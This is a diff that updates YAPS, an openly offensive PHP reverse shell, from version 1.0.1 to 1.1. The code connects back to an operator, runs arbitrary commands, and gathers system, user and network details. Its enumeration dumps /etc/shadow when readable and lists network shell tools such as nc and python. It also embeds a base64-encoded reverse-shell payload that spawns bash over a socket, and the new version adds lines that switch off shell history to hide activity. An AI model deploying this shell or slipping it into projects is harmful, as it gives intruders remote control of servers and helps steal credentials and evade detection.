@@ -1,9 +1,8 @@
 <?php
 # YAPS - Yet Another PHP Shell
-# Version 1.0.1 - 08/07/21
+# Version 1.1 - 12/07/21
 # Made by Nicholas Ferreira
 # https://github.com/Nickguitar/YAPS
-# https://n.0x7359.com/?0b0011
 
 
 //error_reporting(0);
@@ -21,7 +20,8 @@ $resources = array(
 
 $ip = '127.0.0.1';
 $port = 7359;
-$color = true; // colored prompt (prettier :)
+$ps1_color = true; // colored prompt (prettier :)
+$color = true; // prompt, banner, info colors (better readability)
 $use_password = false; // only allows remote using the shell w/ password
 // sha512("vErY_Go0d_$aLt".sha512("password123"))
 $salt = 'v_3_r_Y___G_o_0_d___s_4_L_t';
@@ -38,6 +38,7 @@ if(isset($_REQUEST['x']) && isset($_REQUEST['y'])){
 }
 
 $commands = array(
+	"all-colors",
 //	"backdoor",
 	"color",
 //	"download",
@@ -53,19 +54,24 @@ $commands = array(
 
 
 function green($str){
-	return "\e[92m".$str."\e[0m";
+	global $color;
+	return $color ? "\e[92m".$str."\e[0m" : $str;
 }
 function red($str){
-	return "\e[91m".$str."\e[0m";
+	global $color;
+	return $color ? "\e[91m".$str."\e[0m" : $str;
 }
 function yellow($str){
-	return "\e[93m".$str."\e[0m";
+	global $color;
+	return $color ? "\e[93m".$str."\e[0m" : $str;
 }
 function cyan($str){
-	return "\e[96m".$str."\e[0m";
+	global $color;
+	return $color ? "\e[96m".$str."\e[0m" : $str;
 }
 function white($str){
-	return "\e[97m".$str."\e[0m";
+	global $color;
+	return $color ? "\e[97m".$str."\e[0m" : $str;
 }
 
 function banner(){
@@ -77,7 +83,7 @@ return cyan('
          |   |   |  |         )
          o   o   o  o     o--o
         Yet Another  PHP  Shell').white('
-              Version 1.0
+              Version 1.1
        Coder:  Nicholas Ferreira').'
 
    This is '.red('NOT').' an interactive shell.
@@ -106,6 +112,8 @@ function help(){
 
   '.cyan('!help').'
   	Display this menu
+  '.cyan('!all-colors').'
+  	Toggle all colors (locally only)
   '.cyan('!color').'
   	Toggle $PS1 color (locally only)
   '.cyan('!enum').'
@@ -181,10 +189,11 @@ function sysinfo(){
 
 	$info .= cyan("[i] Hostname: ").run_cmd("hostname");
 	$info .= cyan("[i] Kernel: ").run_cmd("uname -a");
-	$info .= cyan("[i] CPU: ").run_cmd("lscpu | grep -i 'model name' | cut -d':' -f 2 | sed 's/^ *//g'");
-	$info .= cyan("[i] RAM: ").run_cmd("free -h | grep Mem | cut -d':' -f 2 | sed 's/^ *//' | cut -d' ' -f 1");
+	$info .= cyan("[i] CPU: \n").run_cmd("cat /proc/cpuinfo | grep -i 'model name' | cut -d':' -f 2 | sed 's/^ *//g'");
+	$info .= cyan("[i] RAM: \n").run_cmd("cat /proc/meminfo | egrep -i '(memtotal|memfree)'");
 	$info .= cyan("[i] Sudo version: ").run_cmd("sudo --version | grep 'Sudo version' | cut -d' ' -f 3");
 	$info .= cyan("[i] User/groups: ").run_cmd("id").PHP_EOL;
+	$info .= cyan("[i] Active TTY: \n").run_cmd("w").PHP_EOL;
 	fwrite($s, $info);
 
 	fwrite($s,green("====================== Users info ======================\n\n"));
@@ -200,16 +209,16 @@ function sysinfo(){
 		fwrite($s, red("[!] /etc/shadow is readable!\n").run_cmd("cat /etc/shadow").PHP_EOL);
 
 	fwrite($s, green("====================== Net info ======================\n\n"));
-	$info  = cyan("[i] IP Info: ").run_cmd("ifconfig").PHP_EOL;
+	$info  = cyan("[i] IP Info: \n").run_cmd("ifconfig").PHP_EOL;
 	$info .= cyan("[i] Hosts: \n").run_cmd("cat /etc/hosts | grep -v '^#'").PHP_EOL; // /etc/hosts file
 	$info .= cyan("[i] Interfaces/routes: \n").run_cmd("cat /etc/networks && route").PHP_EOL;
 	$info .= cyan("[i] IP Tables rules: \n").run_cmd("(iptables --list-rules 2>/dev/null)").PHP_EOL;
-	$info .= cyan("[i] Active ports: ").run_cmd("(netstat -punta) 2>/dev/null").PHP_EOL; //established, listening, 0.0.0.0, 127.0.0.1
+	$info .= cyan("[i] Active ports: \n").run_cmd("(netstat -punta) 2>/dev/null").PHP_EOL; //established, listening, 0.0.0.0, 127.0.0.1
 	fwrite($s, $info);
 
 	fwrite($s, green("====================== Interesting binaries ======================\n\n"));
 	$interesting_binaries = array('nc','nc.traditional','ncat','nmap','perl','python','python2','python2.6','python2.7','python3','python3.6','python3.7','ruby','node','gcc','g++','docker','php');
-	foreach ($interesting_binaries as $binary) {
+	foreach($interesting_binaries as $binary) {
 		$binary = shell_exec("which $binary 2>/dev/null");
 		if($binary !== "" && base64_encode($binary.PHP_EOL) !== "Cg==") // if not empty or newline
 			fwrite($s, run_cmd("ls -l $binary"));
@@ -327,17 +336,17 @@ function suggester(){//download linux exploit suggester, save to /tmp and change
 }
 
 function refresh_ps1($changecolor=false){ //build a nice PS1, toggle between colored and not colored
-	global $color,$ps1;
+	global $ps1_color,$ps1;
 	$user = str_replace(PHP_EOL, "", run_cmd("whoami"));
 
-	if(!$color){
+	if(!$ps1_color){
 		$ps1 = str_replace(PHP_EOL,"",green($user."@".run_cmd("hostname")).":".cyan(run_cmd("pwd"))."$ "); // user@hostname:~$
 		if($user == "root") $ps1 = str_replace(PHP_EOL,"",red($user."@".run_cmd("hostname")).":".cyan(run_cmd("pwd"))."# "); // root@hostname:~#
-		if($changecolor) $color = true;
+		if($changecolor) $ps1_color = true;
 	}else{
 		$ps1 = str_replace(PHP_EOL,"",$user."@".run_cmd("hostname").":".run_cmd("pwd")."$ "); // user@hostname:~$
 		if($user == "root") $ps1 = str_replace(PHP_EOL,"",$user."@".run_cmd("hostname").":".run_cmd("pwd")."# "); // root@hostname:~#
-		if($changecolor) $color = false;
+		if($changecolor) $ps1_color = false;
 	}
 }
 
@@ -381,7 +390,7 @@ function stabilize(){
 			if($recv_port>65535 || $recv_port==0){
 				fwrite($s,red("[-]")." Port must be between 0-65535.\nChoose another port: ");
 			}else{
-				$payload = "c2hlbGxfZXhlYygiZWNobyAnaWYocGNudGxfZm9yaygpKWV4aXQoMCk7J3xwaHAgLXInZXZhbChmaWxlKFwicGhwOi8vc3RkaW5cIilbMF0pOyciKTskc2NyaXB0PXNoZWxsX2V4ZWMoIndoaWNoIHNjcmlwdCIpOyRweTM9c2hlbGxfZXhlYygid2hpY2ggcHl0aG9uMyIpOyRweT1zaGVsbF9leGVjKCJ3aGljaCBweXRob24iKTtpZihzdHJsZW4oJHNjcmlwdCk+NiAmJiBzdHJwb3MoJHNjcmlwdCwibm90IGZvdW5kIik9PWZhbHNlKSAkc3RhYmlsaXplcj0iL2Jpbi9iYXNoIC1jaSAnIi4kc2NyaXB0LiIgLXFjIC9iaW4vYmFzaCAvZGV2L251bGwnIjtlbHNlIGlmKHN0cmxlbigkcHkzKT43ICYmIHN0cnBvcygkc2NyaXB0LCJub3QgZm91bmQiKT09ZmFsc2UpICRzdGFiaWxpemVyPSRweTMuIiAtYyAnaW1wb3J0IHB0eTtwdHkuc3Bhd24oXCIvYmluL2Jhc2hcIiknIjtlbHNlIGlmKHN0cmxlbigkcHkpPjYgJiYgc3RycG9zKCRzY3JpcHQsIm5vdCBmb3VuZCIpPT1mYWxzZSkgJHN0YWJpbGl6ZXI9JHB5LiIgLWMgJ2ltcG9ydCBwdHk7cHR5LnNwYXduKFwiL2Jpbi9iYXNoXCIpJyI7ZWxzZSAkc3RhYmlsaXplcj0iL2Jpbi9iYXNoIjskc3RhYmlsaXplcj1zdHJfcmVwbGFjZSgiXG4iLCIiLCRzdGFiaWxpemVyKTskc2hlbGw9InVuYW1lIC1hOyRzdGFiaWxpemVyIjt1bWFzaygwKTskc29jaz1mc29ja29wZW4oIklQX0FERFIiLFBPUlQsJGVycm5vLCRlcnJzdHIsMzApOyRzdGQ9YXJyYXkoIDAgPT4gYXJyYXkoInBpcGUiLCJyIiksMSA9PiBhcnJheSgicGlwZSIsInciKSwyID0+IGFycmF5KCJwaXBlIiwidyIpICk7JHByb2Nlc3M9cHJvY19vcGVuKCRzaGVsbCwkc3RkLCRwaXBlcyk7Zm9yZWFjaCgkcGlwZXMgYXMgJHApIHN0cmVhbV9zZXRfYmxvY2tpbmcoJHAsMCk7c3RyZWFtX3NldF9ibG9ja2luZygkc29jaywwKTt3aGlsZSghZmVvZigkc29jaykpeyRyZWFkX2E9YXJyYXkoJHNvY2ssJHBpcGVzWzFdLCRwaXBlc1syXSk7aWYoaW5fYXJyYXkoJHNvY2ssJHJlYWRfYSkpIGZ3cml0ZSgkcGlwZXNbMF0sZnJlYWQoJHNvY2ssMjA0OCkpO2lmKGluX2FycmF5KCRwaXBlc1sxXSwkcmVhZF9hKSkgZndyaXRlKCRzb2NrLGZyZWFkKCRwaXBlc1sxXSwyMDQ4KSk7aWYoaW5fYXJyYXkoJHBpcGVzWzJdLCRyZWFkX2EpKSBmd3JpdGUoJHNvY2ssZnJlYWQoJHBpcGVzWzJdLDIwNDgpKTt9IGZjbG9zZSgkc29jayk7Zm9yZWFjaCgkcGlwZXMgYXMgJHApIGZjbG9zZSgkcCk7cHJvY19jbG9zZSgkcHJvY2Vzcyk7"; // modified php-reverse-shell (works w/ sudo, mysql, ftp, su, etc.) 
+				$payload = "c2hlbGxfZXhlYygiZWNobyAnaWYocGNudGxfZm9yaygpKWV4aXQoMCk7J3xwaHAgLXInZXZhbChmaWxlKFwicGhwOi8vc3RkaW5cIilbMF0pOyciKTskc2NyaXB0PXNoZWxsX2V4ZWMoIndoaWNoIHNjcmlwdCIpOyRweTM9c2hlbGxfZXhlYygid2hpY2ggcHl0aG9uMyIpOyRweT1zaGVsbF9leGVjKCJ3aGljaCBweXRob24iKTtpZihzdHJsZW4oJHNjcmlwdCk+NiAmJiBzdHJwb3MoJHNjcmlwdCwibm90IGZvdW5kIik9PWZhbHNlKSAkc3RhYmlsaXplcj0iL2Jpbi9iYXNoIC1jaSAnIi4kc2NyaXB0LiIgLXFjIC9iaW4vYmFzaCAvZGV2L251bGwnIjtlbHNlIGlmKHN0cmxlbigkcHkzKT43ICYmIHN0cnBvcygkc2NyaXB0LCJub3QgZm91bmQiKT09ZmFsc2UpICRzdGFiaWxpemVyPSRweTMuIiAtYyAnaW1wb3J0IHB0eTtwdHkuc3Bhd24oXCIvYmluL2Jhc2hcIiknIjtlbHNlIGlmKHN0cmxlbigkcHkpPjYgJiYgc3RycG9zKCRzY3JpcHQsIm5vdCBmb3VuZCIpPT1mYWxzZSkgJHN0YWJpbGl6ZXI9JHB5LiIgLWMgJ2ltcG9ydCBwdHk7cHR5LnNwYXduKFwiL2Jpbi9iYXNoXCIpJyI7ZWxzZSAkc3RhYmlsaXplcj0iL2Jpbi9iYXNoIjskc3RhYmlsaXplcj1zdHJfcmVwbGFjZSgiXG4iLCIiLCRzdGFiaWxpemVyKTskc2hlbGw9InVuYW1lIC1hOyRzdGFiaWxpemVyO3NldCArbyBoaXN0b3J5O2V4cG9ydCBISVNUU0laRT0wO3Vuc2V0IEhJU1RTSVpFOyI7dW1hc2soMCk7JHNvY2s9ZnNvY2tvcGVuKCJJUF9BRERSIixQT1JULCRlcnJubywkZXJyc3RyLDMwKTskc3RkPWFycmF5KCAwID0+IGFycmF5KCJwaXBlIiwiciIpLDEgPT4gYXJyYXkoInBpcGUiLCJ3IiksMiA9PiBhcnJheSgicGlwZSIsInciKSApOyRwcm9jZXNzPXByb2Nfb3Blbigkc2hlbGwsJHN0ZCwkcGlwZXMpO2ZvcmVhY2goJHBpcGVzIGFzICRwKSBzdHJlYW1fc2V0X2Jsb2NraW5nKCRwLDApO3N0cmVhbV9zZXRfYmxvY2tpbmcoJHNvY2ssMCk7d2hpbGUoIWZlb2YoJHNvY2spKXskcmVhZF9hPWFycmF5KCRzb2NrLCRwaXBlc1sxXSwkcGlwZXNbMl0pO2lmKGluX2FycmF5KCRzb2NrLCRyZWFkX2EpKSBmd3JpdGUoJHBpcGVzWzBdLGZyZWFkKCRzb2NrLDIwNDgpKTtpZihpbl9hcnJheSgkcGlwZXNbMV0sJHJlYWRfYSkpIGZ3cml0ZSgkc29jayxmcmVhZCgkcGlwZXNbMV0sMjA0OCkpO2lmKGluX2FycmF5KCRwaXBlc1syXSwkcmVhZF9hKSkgZndyaXRlKCRzb2NrLGZyZWFkKCRwaXBlc1syXSwyMDQ4KSk7fSBmY2xvc2UoJHNvY2spO2ZvcmVhY2goJHBpcGVzIGFzICRwKSBmY2xvc2UoJHApO3Byb2NfY2xvc2UoJHByb2Nlc3MpOw=="; // modified php-reverse-shell (works w/ sudo, mysql, ftp, su, etc.) 
 
 				$final_payload = base64_encode(str_replace("IP_ADDR", $ip, str_replace("PORT", $recv_port, base64_decode($payload)))); // changes payload to add correct socket
 				fwrite($s, yellow("[i]")." Trying to connect to $ip:$recv_port\n".cyan("[*] ")."The present shell freezed.\nHit CTRL+C here and use the other or wait for the other to die.\n");
@@ -506,8 +515,11 @@ function passwd(){
 }
 
 function parse_stdin($input){
-	global $s;
+	global $s, $color;
 	switch(substr($input,0,-1)){ // remove newline at end
+		case "!all-colors":
+			$color = !$color;
+			break;
 		case "!info":
 			return sysinfo();
 			break;
@@ -556,6 +568,7 @@ function cmd_not_found($cmd){
 	fwrite($s, yellow("[!] ")."Command '!".substr($c,1,-1)."' not found. Use !help.\n");
 	return;
 }
+
 refresh_ps1(1);
 $nofuncs = red('[-] There are no exec functions');
 if(isAvailable('fsockopen')){
@@ -565,8 +578,6 @@ if(isAvailable('fsockopen')){
 			if(!check_password()) die(fwrite($s,red("[-]")." Wrong password.\n")); // guess what
 		if(!isset($_REQUEST['silent']) && !isset($_REQUEST["s"])) //if not in silent mode
 			fwrite($s, banner()."\n"); //send banner through socket
-		else
-			fwrite($s, "[+] Connection received from YAPS. Press enter.\n");
 		refresh_ps1();
 		fwrite($s, "\n".$ps1);
 		while($c = fread($s, 2048)){
@@ -578,6 +589,10 @@ if(isAvailable('fsockopen')){
 					cmd_not_found(substr($c,1,-1)); // try to suggest correction
 			}elseif(substr($c, 0, 3) == 'cd '){
 				chdir(substr($c, 3, -1)); // since this isn't interactive, use chdir 
+			}elseif(substr($c,0,-1) == "exit"){
+				fwrite($s, yellow("[i] ")."Closing connection.\n");
+				fclose($s);
+				die();
 			}else{
 				$out = run_cmd(substr($c, 0, -1));
 			}
